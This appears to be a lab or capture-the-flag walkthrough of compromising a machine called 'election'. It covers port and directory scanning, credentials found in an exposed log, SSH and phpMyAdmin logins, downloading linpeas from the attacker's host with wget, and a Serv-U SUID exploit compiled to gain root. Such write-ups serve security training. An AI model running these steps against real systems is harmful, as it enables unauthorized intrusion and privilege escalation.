```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap 192.168.233.211
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-14 01:59 GMT
Nmap scan report for 192.168.233.211
Host is up (0.016s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
                                                                                                                        
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap 192.168.233.211 -p 22,80 -sV -sC
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-14 02:00 GMT
Nmap scan report for 192.168.233.211
Host is up (0.013s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.09 seconds

```

Analysing web back-end infrastructures and technologies

![](attachments/Pasted%20image%2020250213205249.png)

**Robots.txt**

![](attachments/Pasted%20image%2020250213205015.png)

**Election Page**

![](attachments/Pasted%20image%2020250213205026.png)


![](attachments/Pasted%20image%2020250213205052.png)

Noted as a possible username that could be valid "admin1".

Starting web directory brute-forcing/busting

```
┌──(kali㉿kali)-[~/Desktop]
└─$ feroxbuster -u http://192.168.233.211
                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.233.211
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      323c http://192.168.233.211/javascript => http://192.168.233.211/javascript/
301      GET        9l       28w      323c http://192.168.233.211/phpmyadmin => http://192.168.233.211/phpmyadmin/
200      GET       15l       74w     6147c http://192.168.233.211/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://192.168.233.211/
301      GET        9l       28w      327c http://192.168.233.211/phpmyadmin/doc => http://192.168.233.211/phpmyadmin/doc/
301      GET        9l       28w      327c http://192.168.233.211/phpmyadmin/sql => http://192.168.233.211/phpmyadmin/sql/
401      GET       14l       54w      462c http://192.168.233.211/phpmyadmin/setup
301      GET        9l       28w      321c http://192.168.233.211/election => http://192.168.233.211/election/
301      GET        9l       28w      330c http://192.168.233.211/phpmyadmin/locale => http://192.168.233.211/phpmyadmin/locale/
301      GET        9l       28w      330c http://192.168.233.211/phpmyadmin/themes => http://192.168.233.211/phpmyadmin/themes/
301      GET        9l       28w      327c http://192.168.233.211/election/admin => http://192.168.233.211/election/admin/
301      GET        9l       28w      325c http://192.168.233.211/election/lib => http://192.168.233.211/election/lib/
301      GET        9l       28w      326c http://192.168.233.211/election/data => http://192.168.233.211/election/data/
200      GET       24l      233w    12280c http://192.168.233.211/election/media/user.png
200      GET       24l       75w      698c http://192.168.233.211/election/js/tripath.localization.js
301      GET        9l       28w      331c http://192.168.233.211/election/languages => http://192.168.233.211/election/languages/
200      GET        1l        1w        4c http://192.168.233.211/election/languages/localize.php
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/fr => http://192.168.233.211/phpmyadmin/locale/fr/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/es => http://192.168.233.211/phpmyadmin/locale/es/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/ru => http://192.168.233.211/phpmyadmin/locale/ru/
301      GET        9l       28w      330c http://192.168.233.211/javascript/jquery => http://192.168.233.211/javascript/jquery/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/nl => http://192.168.233.211/phpmyadmin/locale/nl/
301      GET        9l       28w      326c http://192.168.233.211/phpmyadmin/js => http://192.168.233.211/phpmyadmin/js/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/uk => http://192.168.233.211/phpmyadmin/locale/uk/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/ja => http://192.168.233.211/phpmyadmin/locale/ja/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/sv => http://192.168.233.211/phpmyadmin/locale/sv/
301      GET        9l       28w      332c http://192.168.233.211/phpmyadmin/doc/html => http://192.168.233.211/phpmyadmin/doc/html/
301      GET        9l       28w      328c http://192.168.233.211/election/themes => http://192.168.233.211/election/themes/
301      GET        9l       28w      327c http://192.168.233.211/election/media => http://192.168.233.211/election/media/
301      GET        9l       28w      324c http://192.168.233.211/election/js => http://192.168.233.211/election/js/
200      GET       26l      109w    10366c http://192.168.233.211/election/media/backgrounds/codename-logo.png
200      GET        0l        0w        0c http://192.168.233.211/election/lib/homeAPI.php
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/ro => http://192.168.233.211/phpmyadmin/locale/ro/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/fi => http://192.168.233.211/phpmyadmin/locale/fi/
200      GET     1620l     8202w   740155c http://192.168.233.211/election/media/backgrounds/codename.jpg
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/tr => http://192.168.233.211/phpmyadmin/locale/tr/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/ko => http://192.168.233.211/phpmyadmin/locale/ko/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/da => http://192.168.233.211/phpmyadmin/locale/da/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/sk => http://192.168.233.211/phpmyadmin/locale/sk/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/hu => http://192.168.233.211/phpmyadmin/locale/hu/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/sl => http://192.168.233.211/phpmyadmin/locale/sl/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/lt => http://192.168.233.211/phpmyadmin/locale/lt/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/vi => http://192.168.233.211/phpmyadmin/locale/vi/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/et => http://192.168.233.211/phpmyadmin/locale/et/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/sq => http://192.168.233.211/phpmyadmin/locale/sq/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/de => http://192.168.233.211/phpmyadmin/locale/de/
301      GET        9l       28w      330c http://192.168.233.211/election/admin/js => http://192.168.233.211/election/admin/js/
301      GET        9l       28w      338c http://192.168.233.211/election/admin/components => http://192.168.233.211/election/admin/components/
301      GET        9l       28w      331c http://192.168.233.211/election/admin/css => http://192.168.233.211/election/admin/css/
301      GET        9l       28w      335c http://192.168.233.211/election/admin/plugins => http://192.168.233.211/election/admin/plugins/
301      GET        9l       28w      331c http://192.168.233.211/election/admin/img => http://192.168.233.211/election/admin/img/
200      GET       74l      408w     4517c http://192.168.233.211/election/languages/id-id/loc_ajax.tp
200      GET       43l      211w     2134c http://192.168.233.211/election/languages/id-id/loc_main.tp
200      GET      234l      878w    10543c http://192.168.233.211/election/languages/id-id/loc_admin.tp
200      GET       35l      201w     2186c http://192.168.233.211/election/languages/en-us/loc_plugin_excel_importer.tp
200      GET       44l      211w     1986c http://192.168.233.211/election/languages/en-us/loc_main.tp
200      GET        9l       20w      246c http://192.168.233.211/election/languages/en-us/info.tp
301      GET        9l       28w      332c http://192.168.233.211/election/admin/logs => http://192.168.233.211/election/admin/logs/
200      GET       50l       98w     1708c http://192.168.233.211/election/admin/js/tripath-tiles.js
200      GET      264l      636w     7704c http://192.168.233.211/election/admin/js/material-dashboard.js
200      GET        5l       43w     1268c http://192.168.233.211/election/admin/js/jquery.animatecss.min.js
200      GET      146l      231w     3610c http://192.168.233.211/election/admin/js/index.js
200      GET       13l       22w      415c http://192.168.233.211/election/admin/js/tripath-form-control.js
200      GET       94l      232w     3040c http://192.168.233.211/election/admin/js/tripath-json.js
200      GET        6l       14w      364c http://192.168.233.211/election/admin/components/navbar_header.php
500      GET       14l       23w      702c http://192.168.233.211/election/admin/components/footer.php
200      GET      404l     1175w    16827c http://192.168.233.211/election/admin/js/bootstrap-notify.js
301      GET        9l       28w      332c http://192.168.233.211/election/admin/ajax => http://192.168.233.211/election/admin/ajax/
200      GET        8l      217w    15226c http://192.168.233.211/election/admin/js/jquery.uploadfile.min.js
200      GET        9l      519w    36026c http://192.168.233.211/election/admin/js/chartist.min.js
200      GET     1579l     2856w    23848c http://192.168.233.211/election/admin/css/animate.css
200      GET        1l        2w       15c http://192.168.233.211/election/admin/ajax/op_panitia.php
200      GET        1l        2w       15c http://192.168.233.211/election/admin/ajax/registrasi.php
200      GET        1l        2w       15c http://192.168.233.211/election/admin/ajax/op_pengaturan.php
200      GET        1l        2w       15c http://192.168.233.211/election/admin/ajax/op_relate.php
200      GET        1l        2w       15c http://192.168.233.211/election/admin/ajax/pemilihan.php
200      GET        6l     1429w   121200c http://192.168.233.211/election/admin/css/bootstrap.min.css
200      GET        1l        2w       15c http://192.168.233.211/election/admin/ajax/op_akun.php
200      GET        1l        2w       15c http://192.168.233.211/election/admin/ajax/op_akun_foto.php
200      GET        1l        2w       15c http://192.168.233.211/election/admin/ajax/op_siswa.php
200      GET        1l        2w       15c http://192.168.233.211/election/admin/ajax/hakpilih.php
200      GET        1l        5w       47c http://192.168.233.211/election/admin/ajax/op_updater.php
200      GET        1l        2w       15c http://192.168.233.211/election/admin/ajax/op_kandidat.php
200      GET        1l        2w       15c http://192.168.233.211/election/admin/ajax/op_guru.php
200      GET        1l        2w       15c http://192.168.233.211/election/admin/ajax/login.php
200      GET        1l     6137w   307810c http://192.168.233.211/election/admin/js/moment.min.js
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/it => http://192.168.233.211/phpmyadmin/locale/it/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/pt => http://192.168.233.211/phpmyadmin/locale/pt/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/pl => http://192.168.233.211/phpmyadmin/locale/pl/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/cs => http://192.168.233.211/phpmyadmin/locale/cs/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/ca => http://192.168.233.211/phpmyadmin/locale/ca/
301      GET        9l       28w      339c http://192.168.233.211/phpmyadmin/themes/original => http://192.168.233.211/phpmyadmin/themes/original/
200      GET    10253l    40948w   268026c http://192.168.233.211/javascript/jquery/jquery
301      GET        9l       28w      340c http://192.168.233.211/phpmyadmin/doc/html/_images => http://192.168.233.211/phpmyadmin/doc/html/_images/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/el => http://192.168.233.211/phpmyadmin/locale/el/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/id => http://192.168.233.211/phpmyadmin/locale/id/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/gl => http://192.168.233.211/phpmyadmin/locale/gl/
301      GET        9l       28w      331c http://192.168.233.211/election/admin/inc => http://192.168.233.211/election/admin/inc/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/bg => http://192.168.233.211/phpmyadmin/locale/bg/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/si => http://192.168.233.211/phpmyadmin/locale/si/
301      GET        9l       28w      333c http://192.168.233.211/phpmyadmin/locale/az => http://192.168.233.211/phpmyadmin/locale/az/
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_233_211-1739501504.state ...
[###################>] - 81s  1377786/1380282 0s      found:101     errors:1151332
[####################] - 58s    30000/30000   520/s   http://192.168.233.211/ 
[####################] - 59s    30000/30000   513/s   http://192.168.233.211/javascript/ 
[####################] - 64s    30000/30000   470/s   http://192.168.233.211/phpmyadmin/ 
[####################] - 54s    30000/30000   555/s   http://192.168.233.211/phpmyadmin/themes/ 
[####################] - 56s    30000/30000   540/s   http://192.168.233.211/phpmyadmin/doc/ 
[####################] - 56s    30000/30000   532/s   http://192.168.233.211/phpmyadmin/sql/ 
[####################] - 59s    30000/30000   508/s   http://192.168.233.211/election/ 
[####################] - 50s    30000/30000   599/s   http://192.168.233.211/phpmyadmin/locale/ 
[####################] - 57s    30000/30000   527/s   http://192.168.233.211/javascript/jquery/ 
[####################] - 48s    30000/30000   623/s   http://192.168.233.211/phpmyadmin/js/ 
[####################] - 52s    30000/30000   577/s   http://192.168.233.211/phpmyadmin/doc/html/ 
[####################] - 5s     30000/30000   5624/s  http://192.168.233.211/election/media/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 51s    30000/30000   588/s   http://192.168.233.211/election/admin/ 
[####################] - 5s     30000/30000   5671/s  http://192.168.233.211/election/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s     30000/30000   5589/s  http://192.168.233.211/election/lib/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   909091/s http://192.168.233.211/election/data/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   909091/s http://192.168.233.211/election/media/cache/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   909091/s http://192.168.233.211/election/media/kandidat/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4605/s  http://192.168.233.211/election/languages/ => Directory listing (add --scan-dir-listings to scan) 
```

I noticed that the /logs could be interesting directory.

![](attachments/Pasted%20image%2020250213205428.png)

I attempted to access the system.log file to discover further information:

![](attachments/Pasted%20image%2020250213205731.png)

I've then attempted to login with the above credentials on the machine using SSH.

```
┌──(venv)─(kali㉿kali)-[~/Desktop]
└─$ ssh love@192.168.233.211     
The authenticity of host '192.168.233.211 (192.168.233.211)' can't be established.
ED25519 key fingerprint is SHA256:z1Xg/pSBrK8rLIMLyeb0L7CS1YL4g7BgCK95moiAYhQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.233.211' (ED25519) to the list of known hosts.
love@192.168.233.211's password: 

Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-120-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

471 packages can be updated.
358 updates are security updates.

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Thu Apr  9 23:19:28 2020 from 192.168.1.5
love@election:~$ id
uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
love@election:~$ whoami
love
love@election:~$ pwd
/home/love
love@election:~$ 

```

Moving forward I started looking more into phpMyAdmin

![](attachments/Pasted%20image%2020250213205558.png)

I was able to login using the default credentials that were found on the tool "Creds Search". However, I have used the password "toor" instead and I was able to login. 

![](attachments/Pasted%20image%2020250213205822.png)

![](attachments/Pasted%20image%2020250213205850.png)

After digging around into the custom "election" database, I've managed to find the following information which is an encrypted password for the user Love: 

![](attachments/Pasted%20image%2020250213210256.png)

I've also managed to find the root user's encrypted credentials within the built-in MySQL DB.

![](attachments/Pasted%20image%2020250213210807.png)

Now, in order to escalate our privileges from Love to gain full access into root, I've decided to proceed with launching "linpeas" script.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ peass -h    

> peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/
├── linpeas
│   ├── linpeas_darwin_amd64
│   ├── linpeas_darwin_arm64
│   ├── linpeas_fat.sh
│   ├── linpeas_linux_386
│   ├── linpeas_linux_amd64
│   ├── linpeas_linux_arm
│   ├── linpeas_linux_arm64
│   ├── linpeas.sh
│   └── linpeas_small.sh
└── winpeas
    ├── winPEASany.exe
    ├── winPEASany_ofs.exe
    ├── winPEAS.bat
    ├── winPEASx64.exe
    ├── winPEASx64_ofs.exe
    ├── winPEASx86.exe
    └── winPEASx86_ofs.exe
┌──(kali㉿kali)-[/usr/share/peass]
└─$ cd linpeas     
                                                                                                                        
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ ls
linpeas_darwin_amd64  linpeas_fat.sh     linpeas_linux_amd64  linpeas_linux_arm64  linpeas_small.sh
linpeas_darwin_arm64  linpeas_linux_386  linpeas_linux_arm    linpeas.sh
                                                                                                                        
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

Delivering the Linpeas script to the target. 

```
love@election:/tmp$ wget http://192.168.45.213:8000/linpeas.sh
--2025-02-14 02:36:01--  http://192.168.45.213:8000/linpeas.sh
Connecting to 192.168.45.213:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 830426 (811K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                    100%[=================================================>] 810.96K  1.06MB/s    in 0.7s    

2025-02-14 02:36:02 (1.06 MB/s) - ‘linpeas.sh’ saved [830426/830426]

love@election:/tmp$ ls -la linpeas.sh 
-rw-rw-r-- 1 love love 830426 Jan 13 17:01 linpeas.sh
love@election:/tmp$ 

```

Making the script executable. 

```
love@election:/tmp$ chmod +x linpeas.sh 
love@election:/tmp$ ls -la linpeas.sh 
-rwxrwxr-x 1 love love 830426 Jan 13 17:01 linpeas.sh
love@election:/tmp$ 
```

After launching the linpeas script, the only thing that stood out was a "crontabs".

```
╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                        
  Group love:


...
/var/spool/cron/crontabs
...

```

I was not able to list the directory's content. 

```
love@election:/tmp$ cd /var/spool/cron/crontabs
love@election:/var/spool/cron/crontabs$ ls
ls: cannot open directory '.': Permission denied
love@election:/var/spool/cron/crontabs$ ls -la
ls: cannot open directory '.': Permission denied
love@election:/var/spool/cron/crontabs$ 

```

Moving forward from here, decided to go with more of a manual way instead.

```
love@election:~$ sudo -l
[sudo] password for love: 
Sorry, user love may not run sudo on election.
love@election:~$ ls -la /etc/sudoers
-r--r----- 1 root root 755 May 23  2020 /etc/sudoers
love@election:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

love@election:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/arping
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/pppd
/usr/local/Serv-U/Serv-U
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/bin/fusermount
/bin/ping
/bin/umount
/bin/mount
/bin/su
...
love@election:~$ 

```

From here I've noticed the unusual and uncommon "Serv-U" binary. 

```
love@election:~$ ls -la /usr/local/Serv-U/Serv-U
-rwsr-xr-x 1 root root 6319088 Nov 29  2017 /usr/local/Serv-U/Serv-U

```

A quick Google search from this point lead to finding an exploit script on ExploitDB. 

![](attachments/Pasted%20image%2020250213212623.png)

I was then able to quickly escalate my privileges from Love to Root after compiling the exploit code that was written in C programming language and executing it. 

```
love@election:~$ cd /tmp
love@election:/tmp$ nano priv.c
love@election:/tmp$ gcc priv.c -o exploit
love@election:/tmp$ chmod +x exploit
love@election:/tmp$ ./exploit
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
opening root shell
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
# 
# whoami
root
# 

```

